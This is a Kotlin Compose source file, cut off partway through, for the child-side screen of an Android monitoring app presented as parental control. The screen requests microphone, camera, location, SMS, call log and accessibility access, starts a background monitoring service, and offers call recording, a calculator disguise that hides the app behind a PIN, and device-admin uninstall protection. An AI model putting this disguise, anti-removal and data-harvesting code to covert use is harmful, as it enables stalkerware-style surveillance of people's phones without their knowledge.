package com.example.authapp.ui.screens

import android.Manifest
import android.app.AlarmManager
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.content.Context
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.example.authapp.service.ChildForegroundService
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.ChildCare
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Link
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.NotificationsActive
import androidx.compose.material.icons.filled.Schedule
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.foundation.Image
import androidx.compose.foundation.clickable
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.QrCode
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.ui.graphics.Color
import com.example.authapp.utils.QrCodeUtils
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.authapp.theme.AuthAppTheme

@Composable
fun ChildScreen(
    email: String,
    onSignOut: () -> Unit,
    onLockToCalculator: () -> Unit = {},
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val currentChildUid = com.example.authapp.data.FirebaseRepository.currentUser?.uid ?: ""
    var linkedParentId by remember { mutableStateOf("") }
    var childPairingCode by remember { mutableStateOf<String?>(null) }
    var isGeneratingChildCode by remember { mutableStateOf(false) }
    var showPairingSuccessDialog by remember { mutableStateOf(false) }
    var pairedParentEmail by remember { mutableStateOf("") }

    fun loadOrGenerateChildCode() {
        if (currentChildUid.isEmpty()) return
        isGeneratingChildCode = true
        com.example.authapp.data.FirebaseRepository.getOrGenerateChildPairingCode(currentChildUid, email) { code, _ ->
            isGeneratingChildCode = false
            if (!code.isNullOrBlank()) {
                childPairingCode = code
            }
        }
    }

    LaunchedEffect(currentChildUid, linkedParentId) {
        if (currentChildUid.isNotEmpty() && linkedParentId.isEmpty()) {
            loadOrGenerateChildCode()
        }
    }

    var isDeviceAdminActive by remember { mutableStateOf(com.example.authapp.utils.DeviceAdminManager.isDeviceAdminActive(context)) }
    var isStealthMode by remember { mutableStateOf(com.example.authapp.data.AppPreferences.isStealthModeEnabled(context)) }
    var currentSecretPin by remember { mutableStateOf(com.example.authapp.data.AppPreferences.getSecretPin(context)) }
    var showChangePinDialog by remember { mutableStateOf(false) }
    var newPinInput by remember { mutableStateOf("") }
    var showDisableAdminPinDialog by remember { mutableStateOf(false) }
    var disableAdminPinInput by remember { mutableStateOf("") }
    var disableAdminPinError by remember { mutableStateOf<String?>(null) }

    DisposableEffect(currentChildUid) {
        if (currentChildUid.isEmpty()) return@DisposableEffect onDispose {}
        val listener = com.example.authapp.data.FirebaseRepository.listenToChildParentLink(currentChildUid) { parentId ->
            linkedParentId = parentId
        }
        onDispose {
            com.example.authapp.data.FirebaseRepository.removeValueListener("users/$currentChildUid/parentId", listener)
        }
    }

    var hasStage1Permissions by remember { mutableStateOf(false) }
    var hasCallPermissions by remember { mutableStateOf(false) }
    var hasOverlayPermission by remember { mutableStateOf(false) }
    var isBatteryOptimizationIgnored by remember { mutableStateOf(false) }
    var hasExactAlarmPermission by remember { mutableStateOf(false) }
    var hasNotificationListenerPermission by remember { mutableStateOf(false) }
    var hasUsageAccessPermission by remember { mutableStateOf(false) }
    var hasAccessibilityPermission by remember { mutableStateOf(false) }

    fun isMicrophoneAndCameraGranted(): Boolean {
        val mic = ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val cam = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val loc = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
        return mic && cam && loc
    }

    fun checkExactAlarmPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
            alarmManager?.canScheduleExactAlarms() == true
        } else true
    }

    fun checkNotificationListenerPermission(): Boolean {
        val enabledListeners = android.provider.Settings.Secure.getString(
            context.contentResolver, "enabled_notification_listeners"
        ) ?: return false
        return enabledListeners.contains(context.packageName)
    }

    fun checkUsageAccessPermission(): Boolean {
        return try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as? android.app.AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps?.unsafeCheckOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), context.packageName)
            } else {
                @Suppress("DEPRECATION")
                appOps?.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), context.packageName)
            }
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }
    }

    fun checkAccessibilityPermission(): Boolean {
        return try {
            val services = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            services.contains(context.packageName)
        } catch (_: Exception) { false }
    }

    fun startMonitoringService() {
        val serviceIntent = Intent(context, ChildForegroundService::class.java).apply {
            action = ChildForegroundService.ACTION_START_MONITORING
        }
        try {
            ContextCompat.startForegroundService(context, serviceIntent)
            com.example.authapp.sync.KeepAliveWorker.schedule(context)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun checkPermissions() {
        hasStage1Permissions = isMicrophoneAndCameraGranted()
        hasCallPermissions = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            hasOverlayPermission = Settings.canDrawOverlays(context)
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            isBatteryOptimizationIgnored = pm.isIgnoringBatteryOptimizations(context.packageName)
        } else {
            hasOverlayPermission = true
            isBatteryOptimizationIgnored = true
        }
        hasExactAlarmPermission = checkExactAlarmPermission()
        hasNotificationListenerPermission = checkNotificationListenerPermission()
        hasUsageAccessPermission = checkUsageAccessPermission()
        hasAccessibilityPermission = checkAccessibilityPermission()
        isDeviceAdminActive = com.example.authapp.utils.DeviceAdminManager.isDeviceAdminActive(context)

        if (hasCallPermissions && currentChildUid.isNotEmpty()) {
            com.example.authapp.data.CallLogSyncManager.syncIfDue(context, currentChildUid)
        }

        // Synchronize full real-time device health to Firebase Realtime Database
        com.example.authapp.analytics.AppHealthTelemetry.syncDeviceHealth(context)

        if (hasStage1Permissions) {
            startMonitoringService()
        }
    }

    val stage1Launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        hasStage1Permissions = isMicrophoneAndCameraGranted()
        hasCallPermissions = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
        com.example.authapp.analytics.AppHealthTelemetry.syncDeviceHealth(context)

        if (hasStage1Permissions) {
            com.example.authapp.analytics.AppHealthTelemetry.logDiagnostic(
                context, "PERMISSIONS", "SUCCESS", "Required media permissions granted by child user"
            )
            startMonitoringService()

            // Auto-trigger native Android Battery Optimization pop-up dialog
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !isBatteryOptimizationIgnored) {
                try {
                    val batteryIntent = Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:${context.packageName}")
                    )
                    context.startActivity(batteryIntent)
                } catch (_: Exception) {}
            }
        } else {
            val deniedList = permissions.filter { !it.value }.keys.joinToString(", ")
            com.example.authapp.analytics.AppHealthTelemetry.logDiagnostic(
                context, "PERMISSIONS", "FAILED", "Permissions denied by child user: $deniedList"
            )
        }
    }

    fun triggerCorePermissionsRequest() {
        val perms = mutableListOf(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        stage1Launcher.launch(perms.toTypedArray())
    }

    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
                checkPermissions()
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    LaunchedEffect(hasStage1Permissions) {
        if (hasStage1Permissions) {
            startMonitoringService()
        }
    }

    val permPrefs = remember { context.getSharedPreferences("child_permission_prefs", Context.MODE_PRIVATE) }
    var callRecordingEnabled by remember {
        mutableStateOf(com.example.authapp.data.CallRecordingPreferences.isEnabled(context))
    }

    LaunchedEffect(Unit) {
        checkPermissions()
        // Automatically trigger Android's native system permission pop-up dialog (like Flipkart/WhatsApp)
        if (!hasStage1Permissions || !hasCallPermissions) {
            triggerCorePermissionsRequest()
        }
    }

    Column(
        modifier = modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Top
    ) {
        Spacer(modifier = Modifier.height(16.dp))

        Box(
            modifier = Modifier
                .size(80.dp)
                .clip(CircleShape)
                .background(MaterialTheme.colorScheme.primaryContainer),
            contentAlignment = Alignment.Center
        ) {
            Icon(
                imageVector = Icons.Default.ChildCare,
                contentDescription = "Child Icon",
                tint = MaterialTheme.colorScheme.primary,
                modifier = Modifier.size(44.dp)
            )
        }

        Spacer(modifier = Modifier.height(16.dp))

        Text(
            text = "Child Dashboard",
            style = MaterialTheme.typography.headlineMedium.copy(fontWeight = FontWeight.Bold),
            color = MaterialTheme.colorScheme.onBackground
        )

        Spacer(modifier = Modifier.height(4.dp))

        Surface(
            color = MaterialTheme.colorScheme.secondaryContainer,
            shape = RoundedCornerShape(12.dp),
            modifier = Modifier.padding(vertical = 4.dp)
        ) {
            Text(
                text = "Default Account Role: CHILD",
                style = MaterialTheme.typography.labelLarge.copy(fontWeight = FontWeight.Bold),
                color = MaterialTheme.colorScheme.onSecondaryContainer,
                modifier = Modifier.padding(horizontal = 12.dp, vertical = 6.dp)
            )
        }

        Spacer(modifier = Modifier.height(4.dp))

        Text(
            text = email,
            style = MaterialTheme.typography.bodyMedium,
            color = MaterialTheme.colorScheme.onSurfaceVariant
        )

        Spacer(modifier = Modifier.height(24.dp))

        val allSpecialGranted = hasOverlayPermission && isBatteryOptimizationIgnored && hasNotificationListenerPermission && hasExactAlarmPermission && hasUsageAccessPermission && hasAccessibilityPermission
        val allCoreGranted = hasStage1Permissions && hasCallPermissions

        @Composable
        fun RenderSpecialPermissions() {
            SpecialPermissionsCard(
                hasNotificationListener = hasNotificationListenerPermission,
                hasAccessibility = hasAccessibilityPermission,
                hasOverlay = hasOverlayPermission,
                hasUsageAccess = hasUsageAccessPermission,
                isBatteryOptimizationIgnored = isBatteryOptimizationIgnored,
                hasExactAlarm = hasExactAlarmPermission,
                onOpenNotificationListener = { try { context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) } catch (_: Exception) {} },
                onOpenAccessibility = { try { context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (_: Exception) {} },
                onOpenOverlay = { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) try { context.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${context.packageName}"))) } catch (_: Exception) {} },
                onOpenUsageAccess = { try { context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) } catch (_: Exception) {} },
                onOpenBatteryOptimization = {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        try { context.startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:${context.packageName}"))) }
                        catch (_: Exception) { try { context.startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)) } catch (_: Exception) {} }
                    }
                },
                onOpenExactAlarm = { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) try { context.startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM, Uri.parse("package:${context.packageName}"))) } catch (_: Exception) {} }
            )
        }

        if (linkedParentId.isEmpty()) {
            // STATE A: NOT LINKED YET - Focus on Pairing & Setup
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.tertiaryContainer.copy(alpha = 0.45f)
                ),
                border = androidx.compose.foundation.BorderStroke(1.dp, MaterialTheme.colorScheme.tertiary)
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Default.QrCode, contentDescription = null, tint = MaterialTheme.colorScheme.tertiary)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "Link Device With Parent",
                            style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold),
                            color = MaterialTheme.colorScheme.onSurface
                        )
                    }
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        text = "Scan this QR Code or enter the 6-Digit Code in Parent Dashboard to connect.",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    Spacer(modifier = Modifier.height(14.dp))

                    val qrBitmap = remember(childPairingCode) {
                        childPairingCode?.let { code ->
                            QrCodeUtils.generateQrImageBitmap(code, 512)
                        }
                    }
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(vertical = 4.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        if (qrBitmap != null) {
                            Surface(
                                shape = RoundedCornerShape(16.dp),
                                shadowElevation = 3.dp,
                                color = androidx.compose.ui.graphics.Color.White,
                                modifier = Modifier.padding(4.dp)
                            ) {
                                Image(
                                    bitmap = qrBitmap,
                                    contentDescription = "Pairing QR Code",
                                    modifier = Modifier
                                        .size(180.dp)
                                        .padding(10.dp)
                                )
                            }
                        } else {
                            Box(
                                modifier = Modifier
                                    .size(180.dp)
                                    .background(MaterialTheme.colorScheme.surfaceVariant, RoundedCornerShape(16.dp)),
                                contentAlignment = Alignment.Center
                            ) {
                                CircularProgressIndicator(modifier = Modifier.size(32.dp))
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(12.dp),
                        color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f),
                        border = androidx.compose.foundation.BorderStroke(1.dp, MaterialTheme.colorScheme.outlineVariant)
                    ) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(horizontal = 16.dp, vertical = 10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Column {
                                Text(
                                    text = "PAIRING CODE",
                                    style = MaterialTheme.typography.labelSmall.copy(letterSpacing = 1.sp),
                                    color = MaterialTheme.colorScheme.primary
                                )
                                Text(
                                    text = childPairingCode ?: "------",
                                    style = MaterialTheme.typography.headlineMedium.copy(
                                        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                        fontWeight = FontWeight.Bold,
                                        letterSpacing = 6.sp
                                    ),
                                    color = MaterialTheme.colorScheme.onSurface
                                )
                            }
                            IconButton(
                                onClick = {
                                    childPairingCode?.let { code ->
                                        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                                        val clip = android.content.ClipData.newPlainText("Pairing Code", code)
                                        clipboard.setPrimaryClip(clip)
                                        android.widget.Toast.makeText(context, "Pairing code copied!", android.widget.Toast.LENGTH_SHORT).show()
                                    }
                                },
                                enabled = !childPairingCode.isNullOrEmpty()
                            ) {
                                Icon(Icons.Default.ContentCopy, contentDescription = "Copy Code", tint = MaterialTheme.colorScheme.primary)
                            }
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            if (!allCoreGranted) {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.Warning, contentDescription = null, tint = MaterialTheme.colorScheme.error)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "App Permissions Required",
                                style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold)
                            )
                        }
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "Grant permissions so remote monitoring can start.",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                        Spacer(modifier = Modifier.height(10.dp))
                        Button(
                            onClick = { triggerCorePermissionsRequest() },
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Text("Grant Permissions")
                        }
                    }
                }
                Spacer(modifier = Modifier.height(14.dp))
            }

            RenderSpecialPermissions()
            Spacer(modifier = Modifier.height(14.dp))
        } else {
            // STATE B: LINKED & PROTECTED - Clean Minimal Dashboard (Only 2 Cards!)
            // Card 1: Unified Status Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.5f)
                ),
                border = androidx.compose.foundation.BorderStroke(1.dp, MaterialTheme.colorScheme.primary.copy(alpha = 0.5f))
            ) {
                Row(
                    modifier = Modifier.padding(16.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Box(
                        modifier = Modifier
                            .size(42.dp)
                            .clip(CircleShape)
                            .background(MaterialTheme.colorScheme.primary),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            imageVector = Icons.Default.Check,
                            contentDescription = null,
                            tint = MaterialTheme.colorScheme.onPrimary,
                            modifier = Modifier.size(24.dp)
                        )
                    }
                    Spacer(modifier = Modifier.width(14.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            text = "Device Protected & Active",
                            style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold),
                            color = MaterialTheme.colorScheme.onSurface
                        )
                        Spacer(modifier = Modifier.height(2.dp))
                        Text(
                            text = "Connected to Parent • Telemetry & monitoring active",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(14.dp))

            // Card: Live System Permissions Status (Always accessible in Linked state too)
            RenderSpecialPermissions()

            Spacer(modifier = Modifier.height(14.dp))

            // Card 2: Unified Device Controls Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    // 1. Stealth Calculator
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(
                            imageVector = Icons.Default.Lock,
                            contentDescription = null,
                            tint = MaterialTheme.colorScheme.primary,
                            modifier = Modifier.size(22.dp)
                        )
                        Spacer(modifier = Modifier.width(10.dp))
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "Stealth Calculator",
                                style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold)
                            )
                            Text(
                                text = "PIN: $currentSecretPin (Enter PIN & press '=')",
                                style = MaterialTheme.typography.bodySmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }
                        Switch(
                            checked = isStealthMode,
                            onCheckedChange = { enabled ->
                                isStealthMode = enabled
                                com.example.authapp.data.AppPreferences.setStealthModeEnabled(context, enabled)
                            }
                        )
                    }

                    Spacer(modifier = Modifier.height(10.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(10.dp)
                    ) {
                        OutlinedButton(
                            onClick = {
                                newPinInput = currentSecretPin
                                showChangePinDialog = true
                            },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Text("Change PIN")
                        }

                        Button(
                            onClick = {
                                com.example.authapp.data.AppPreferences.setStealthModeEnabled(context, true)
                                isStealthMode = true
                                onLockToCalculator()
                            },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Text("Lock Now")
                        }
                    }

                    Spacer(modifier = Modifier.height(14.dp))
                    HorizontalDivider(color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.5f))
                    Spacer(modifier = Modifier.height(14.dp))

                    // 2. Call Recording
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "Call Recording",
                                style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold)
                            )
                            Spacer(modifier = Modifier.height(2.dp))
                            Text(
                                text = "Record phone calls and sync logs.",
                                style = MaterialTheme.typography.bodySmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }
                        Switch(
                            checked = callRecordingEnabled,
                            onCheckedChange = { enabled ->
                                callRecordingEnabled = enabled
                                com.example.authapp.data.CallRecordingPreferences.setEnabled(context, enabled)
                            }
                        )
                    }

                    Spacer(modifier = Modifier.height(14.dp))
                    HorizontalDivider(color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.5f))
                    Spacer(modifier = Modifier.height(14.dp))

                    // 3. Uninstall Protection
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "Uninstall Protection",
                                style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold)
                            )
                            Spacer(modifier = Modifier.height(2.dp))
                            Text(
                                text = if (isDeviceAdminActive) "Protected with Device Admin" else "Prevent app uninstallation",
                                style = MaterialTheme.typography.bodySmall,
                                color = if (isDeviceAdminActive) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }
                        if (!isDeviceAdminActive) {
                            Button(
                                onClick = { com.example.authapp.utils.DeviceAdminManager.requestDeviceAdmin(context) },
                                shape = RoundedCornerShape(10.dp)
                            ) {
                                Text("Enable")
                            }
                        } else {
                            OutlinedButton(
                                onClick = { showDisableAdminPinDialog = true },
                                shape = RoundedCornerShape(10.dp)
                            ) {
                                Text("Disable")
                            }
                        }
                    }
                }
            }

            if (showDisableAdminPinDialog) {
                AlertDialog(
                    onDismissRequest = {
                        showDisableAdminPinDialog = false
                        disableAdminPinInput = ""
                        disableAdminPinError = null
                    },
                    title = { Text("Parent PIN Required 🛡️") },
                    text = {
                        Column {
                            Text("Enter the 6-digit Parent PIN to disable uninstall protection.")
                            Spacer(modifier = Modifier.height(12.dp))
                            OutlinedTextField(
                                value = disableAdminPinInput,
                                onValueChange = {
                                    if (it.length <= 6 && it.all { c -> c.isDigit() }) {
                                        disableAdminPinInput = it
                                        disableAdminPinError = null
                                    }
                                },
                                label = { Text("6-Digit PIN") },
                                isError = disableAdminPinError != null,
                                keyboardOptions = androidx.compose.foundation.text.KeyboardOptions(keyboardType = androidx.compose.ui.text.input.KeyboardType.NumberPassword),
                                visualTransformation = androidx.compose.ui.text.input.PasswordVisualTransformation(),
                                singleLine = true,
                                modifier = Modifier.fillMaxWidth()
                            )
                            if (disableAdminPinError != null) {
                                Spacer(modifier = Modifier.height(4.dp))
                                Text(disableAdminPinError!!, color = MaterialTheme.colorScheme.error, style = MaterialTheme.typography.bodySmall)
                            }
                        }
                    },
                    confirmButton = {
                        Button(
                            onClick = {
                                val isOk = com.example.authapp.utils.UninstallProtectionManager.verifyPin(context, disableAdminPinInput)
                                if (isOk) {
                                    com.example.authapp.utils.DeviceAdminManager.deactivateDeviceAdmin(context)
                                    isDeviceAdminActive = false
                                    showDisableAdminPinDialog = false
                                    disableAdminPinInput = ""
                                    disableAdminPinError = null
                                    android.widget.Toast.makeText(context, "Device Admin Deactivated", android.widget.Toast.LENGTH_SHORT).show()
                                } else {
                                    disableAdminPinError = "Incorrect 6-digit PIN!"
                                }
                            }
                        ) {
                            Text("Verify & Disable")
                        }
                    },
                    dismissButton = {
                        TextButton(onClick = {
                            showDisableAdminPinDialog = false
                            disableAdminPinInput = ""
                            disableAdminPinError = null
                        }) {
                            Text("Cancel")
                        }
                    }
                )
            }
        }


        Spacer(modifier = Modifier.height(24.dp))

        Button(
            onClick = onSignOut,
            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error),
            shape = RoundedCornerShape(12.dp),
            modifier = Modifier.fillMaxWidth().height(50.dp)
        ) {
            Text("Sign Out", fontWeight = FontWeight.Bold, fontSize = 16.sp)
        }

        if (showPairingSuccessDialog) {
            AlertDialog(
                onDismissRequest = { showPairingSuccessDialog = false },
                icon = {
                    Icon(
                        imageVector = Icons.Default.CheckCircle,
                        contentDescription = null,
                        tint = MaterialTheme.colorScheme.primary,
                        modifier = Modifier.size(52.dp)
                    )
                },
                title = {
                    Text(
                        text = "Device Paired Successfully!",
                        style = MaterialTheme.typography.titleLarge.copy(fontWeight = FontWeight.Bold),
                        textAlign = TextAlign.Center
                    )
                },
                text = {
                    Text(
                        text = "This phone is now securely connected with $pairedParentEmail. Background protection and remote monitoring are fully active.",
                        style = MaterialTheme.typography.bodyMedium,
                        textAlign = TextAlign.Center
                    )
                },
                confirmButton = {
                    Button(
                        onClick = { showPairingSuccessDialog = false },
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Text("Continue")
                    }
                }
            )
        }

        if (showChangePinDialog) {
            AlertDialog(
                onDismissRequest = { showChangePinDialog = false },
                icon = {
                    Icon(Icons.Default.Lock, contentDescription = null, tint = MaterialTheme.colorScheme.primary)
                },
                title = {
                    Text("Change Secret PIN", fontWeight = FontWeight.Bold)
                },
                text = {
                    Column {
                        Text(
                            "Enter a new 4 to 6 digit secret passcode. You will need this PIN followed by '=' to unlock this dashboard from the calculator.",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                        Spacer(modifier = Modifier.height(12.dp))
                        OutlinedTextField(
                            value = newPinInput,
                            onValueChange = { if (it.length <= 6 && it.all { char -> char.isDigit() }) newPinInput = it },
                            label = { Text("New PIN (digits only)") },
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                            keyboardOptions = androidx.compose.foundation.text.KeyboardOptions(
                                keyboardType = androidx.compose.ui.text.input.KeyboardType.Number
                            )
                        )
                    }
                },
                confirmButton = {
                    Button(
                        onClick = {
                            if (newPinInput.length >= 4) {
                                currentSecretPin = newPinInput
                                com.example.authapp.data.AppPreferences.saveSecretPin(context, newPinInput)
                                showChangePinDialog = false
                                android.widget.Toast.makeText(context, "Secret PIN updated", android.widget.Toast.LENGTH_SHORT).show()
                            } else {
                                android.widget.Toast.makeText(context, "PIN must be at least 4 digits", android.widget.Toast.LENGTH_SHORT).show()
                            }
                        }
                    ) {
                        Text("Save PIN")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showChangePinDialog = false }) {
                        Text("Cancel")
                    }
                }
            )
        }
    }
}

@Composable
fun SpecialPermissionsCard(
    hasNotificationListener: Boolean,
    hasAccessibility: Boolean,
    hasOverlay: Boolean,
    hasUsageAccess: Boolean,
    isBatteryOptimizationIgnored: Boolean,
    hasExactAlarm: Boolean,
    onOpenNotificationListener: () -> Unit,
    onOpenAccessibility: () -> Unit,
    onOpenOverlay: () -> Unit,
    onOpenUsageAccess: () -> Unit,
    onOpenBatteryOptimization: () -> Unit,
